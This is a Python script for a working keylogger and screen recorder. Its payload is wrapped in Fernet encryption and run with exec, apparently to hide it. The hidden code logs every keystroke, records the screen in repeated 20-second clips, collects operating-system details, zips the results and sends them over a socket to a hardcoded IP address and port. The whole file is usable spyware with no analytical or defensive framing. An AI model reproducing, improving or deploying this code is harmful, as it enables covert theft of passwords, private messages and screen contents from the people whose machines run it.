from cryptography.fernet import Fernet
import base64

from os import path, mkdir, remove
from platform import system, release, architecture
from time import sleep
from pynput.keyboard import Listener
from numpy import array
from cv2 import VideoWriter_fourcc, VideoWriter, cvtColor, destroyAllWindows, COLOR_BGR2RGB
from pyautogui import size, screenshot
from threading import Thread
from shutil import make_archive
from socket import socket, AF_INET, SOCK_STREAM
from tqdm import tqdm
from tempfile import gettempdir
#host and port should stay in the 19/20 lines

code = b"""
HOST='192.168.43.219'
PORT=4466

            #modules needed
from os import path, mkdir, remove
from platform import system, release, architecture
from time import sleep
from pynput.keyboard import Listener
from numpy import array
from cv2 import VideoWriter_fourcc, VideoWriter, cvtColor, destroyAllWindows, COLOR_BGR2RGB
from pyautogui import size, screenshot
from threading import Thread
from shutil import make_archive
from socket import socket, AF_INET, SOCK_STREAM
from tqdm import tqdm
from tempfile import gettempdir

            #functions
def keyboard_monitoring():
    #collect events (pressed keys)
    with Listener(on_press=savekey) as listener:
        listener.join()

def record():
    while True:
        screen_size = tuple(size())
        fourcc = VideoWriter_fourcc(*"XVID")
        fps = 12
        video_file = "C:/Docs/vid.avi"
        out = VideoWriter(video_file, fourcc, fps, screen_size)
        time2rec = 20
        for i in range(int(time2rec * fps)):
            img = screenshot()
            # convert these pixels to a proper numpy array to work with OpenCV
            frame = array(img)
            # convert colors from BGR to RGB
            frame = cvtColor(frame, COLOR_BGR2RGB)
            # write the frame
            out.write(frame)
        destroyAllWindows()
        out.release()
        #sleep(10)
        make_archive(temp_zip, 'zip', "C:/Docs")
        info()
        remove("C:/Docs/vid.avi")
        send_Docs()
        remove(temp_zip + ".zip")

def savekey(key):
    keys_file = open("C:/Docs/keys.txt", "a")
    keys_file.write(str(key)+"\\n")
    keys_file.close()

def send_Docs():
    filename = temp_zip +".zip"
    filesize = path.getsize(filename)
    buffer_size = 4096
    my_sock = socket(AF_INET, SOCK_STREAM)
    my_sock.connect((HOST, PORT))
    progress = tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(buffer_size)
            if not bytes_read:
                # file transmitting is done
                break
            my_sock.sendall(bytes_read)
            progress.update(len(bytes_read))
    my_sock.close()
def info():
    keys_file = open("C:/Docs/keys.txt", "w")
    keys_file.write(os_info+"\\n\\n")
    keys_file.close()
            #1-create if it doesn't exist Docs | clear keys.txt | info-gath
Docs_exist = path.isdir("C:/Docs")
if Docs_exist == False:
    mkdir("C:/Docs")
keys_file = open("C:/Docs/keys.txt", "w").close()
os_info = "OS name: "+str(system())+"   OS version: "+str(release())+"  architecture: "+str(architecture())
info()
temp_zip = gettempdir() + "\\Docs_z"
           #2-start monitoring
thread1 = Thread(target=keyboard_monitoring)
thread2 = Thread(target=record)
thread1.start()
thread2.start()
"""

key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)

decrypted_message = encryption_type.decrypt(encrypted_message)

exec(decrypted_message)
